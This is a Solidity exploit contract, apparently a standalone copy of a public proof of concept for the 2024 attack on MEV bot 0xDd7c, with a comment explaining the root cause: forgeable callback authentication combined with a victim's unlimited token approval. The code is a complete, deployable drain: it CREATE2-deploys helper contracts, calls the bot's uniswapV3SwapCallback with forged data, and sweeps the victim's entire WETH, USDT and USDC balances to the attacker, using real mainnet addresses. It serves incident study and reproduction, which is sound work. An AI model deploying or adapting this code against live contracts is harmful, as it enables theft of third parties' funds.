// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-MEVbot_0xdd7c).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` (attacker == address(this); no separate "exploit contract"
// beyond the CREATE2-deployed per-leg helper `Money`). `ContractTest.testExpolit()`
// runs three identical legs (WETH, USDT, USDC): for each token it CREATE2-deploys
// a fresh `Money` helper at a salt-chosen address, then calls `Money.attack(...)`,
// which:
//   1. asks the deployer (`owner`, i.e. `ContractTest`/this contract) for
//      `keccak256(type(Money).creationCode)`,
//   2. builds a `SwapData{ vuln, factory, codehash, data }` blob where
//      `vuln` = the victim MEV bot, `factory` = the deployer, `codehash` = the
//      Money creation-code hash, `data` = a fake V3-style (tokenIn, fee,
//      tokenOut) path,
//   3. calls the VULNERABLE bot's `uniswapV3SwapCallback(int256,int256,bytes)`
//      (selector 0xfa461e33) directly with that forged data,
//   4. sweeps whatever the bot paid out back to the deployer.
//
// This is a faithful, self-contained copy collapsed into ONE deployable
// contract: the outer entrypoint (`run()`, mirrors `ContractTest.testExpolit()`)
// IS the CREATE2 factory (`address(this)` plays the role of `ContractTest`),
// and it deploys three `Money` instances via a nested contract exactly as the
// original does. Logic and constants are copied verbatim from
// test/MEVbot_0xdd7c_exp.sol.
//
// Root cause: the vulnerable MEV bot `0xDd7c...3685` re-derives its Uniswap-V3
// callback pool address as CREATE2(factory, salt, codehash) using `factory` and
// `codehash` fields read straight out of the ATTACKER-SUPPLIED callback `data`
// (instead of hard-coded protocol constants), then checks
// `require(msg.sender == derivedPool)`. Because the attacker controls both
// inputs to that derivation, they simply CREATE2-deploy a contract at exactly
// the address the bot will (re)compute, so the "authentication" check
// tautologically passes for the attacker's own contract. The bot then executes
// `token.transferFrom(data.vuln, msg.sender, amount)` — pulling tokens out of a
// THIRD party (`0x0000...696355`, "Victim") that had granted the vulnerable bot
// an unlimited (`type(uint256).max`) approval. Two independent flaws compose:
// forgeable callback authentication (bot side) + unbounded standing approval
// (victim side).

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

library DATA {
    struct SwapData {
        address vuln;
        address factory;
        bytes32 codehash;
        bytes data;
    }
}

interface IFactory {
    function getcodehash() external returns (bytes32);
}

contract MEVbotDrain {
    IERC20Like internal constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like internal constant USDT = IERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Like internal constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address internal constant VULN_BOT = 0xDd7c2987686B21f656F036458C874D154A923685;
    address internal constant VICTIM = 0x0000000000E715268E0fe41ced1dd101Fc696355;

    /// @notice Recorded attack entrypoint: mirrors `ContractTest.testExpolit()`.
    ///         Runs all three legs (WETH, then USDT, then USDC) — each one
    ///         CREATE2-deploys a fresh `Money` helper at the salt derived from
    ///         `keccak256(abi.encode(token, token, 0))` and drains the victim's
    ///         full balance of that token through the forged callback.
    function run() external {
        bytes32 wethSalt = keccak256(abi.encode(address(WETH), address(WETH), uint256(0)));
        address moneyA = _create2Money(wethSalt);
        uint256 wethAmount = WETH.balanceOf(VICTIM);
        Money(moneyA).attack(VICTIM, address(WETH), wethAmount);

        bytes32 usdtSalt = keccak256(abi.encode(address(USDT), address(USDT), uint256(0)));
        address moneyB = _create2Money(usdtSalt);
        uint256 usdtAmount = USDT.balanceOf(VICTIM);
        Money(moneyB).attack(VICTIM, address(USDT), usdtAmount);

        bytes32 usdcSalt = keccak256(abi.encode(address(USDC), address(USDC), uint256(0)));
        address moneyC = _create2Money(usdcSalt);
        uint256 usdcAmount = USDC.balanceOf(VICTIM);
        Money(moneyC).attack(VICTIM, address(USDC), usdcAmount);
    }

    /// @notice CREATE2-deploys a `Money` helper with the given salt — mirrors
    ///         `ContractTest.create_contract(tokenhash)`.
    function _create2Money(bytes32 salt) internal returns (address addr) {
        bytes memory bytecode = type(Money).creationCode;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
    }

    /// @notice Called back by `Money` to supply `keccak256(type(Money).creationCode)`
    ///         — the exact codehash the vulnerable bot needs to see so its
    ///         CREATE2 re-derivation lands on this `Money` instance's real
    ///         address. Mirrors `ContractTest.getcodehash()`.
    function getcodehash() external pure returns (bytes32) {
        return keccak256(type(Money).creationCode);
    }

    // The exploit contract itself receives the swept ERC20s from each `Money`
    // leg (see `Money.attack`, which forwards to `owner` = this contract). No
    // fallback/receive needed for ERC20 transfers.
}

/// @notice Per-leg CREATE2-deployed helper. Faithful copy of `Money` from
///         test/MEVbot_0xdd7c_exp.sol.
contract Money {
    IERC20Like internal constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like internal constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Like internal constant USDT = IERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    address internal constant VULN_BOT = 0xDd7c2987686B21f656F036458C874D154A923685;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Forges the callback data and calls the vulnerable bot's
    ///         `uniswapV3SwapCallback` directly, then sweeps whatever the bot
    ///         paid out back to `owner` (the outer exploit contract).
    function attack(address vuln, address token, uint256 amount) public {
        bytes32 codehash = IFactory(owner).getcodehash();
        DATA.SwapData memory datas = DATA.SwapData({
            vuln: vuln,
            factory: owner,
            codehash: codehash,
            data: abi.encodePacked(token, hex"000000", token)
        });
        bytes memory data = abi.encode(datas);

        // amount0 = -1 (sentinel, unused by the forged path), amount1 = amount
        // owed — the bot reads `amount` from whichever of amount0/amount1 is
        // positive and pulls that much of `token` from `data.vuln`.
        VULN_BOT.call(abi.encodeWithSelector(bytes4(0xfa461e33), int256(-1), int256(amount), data));

        WETH.transfer(owner, WETH.balanceOf(address(this)));
        address(USDT).call(abi.encodeWithSelector(bytes4(0xa9059cbb), owner, USDT.balanceOf(address(this))));
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}
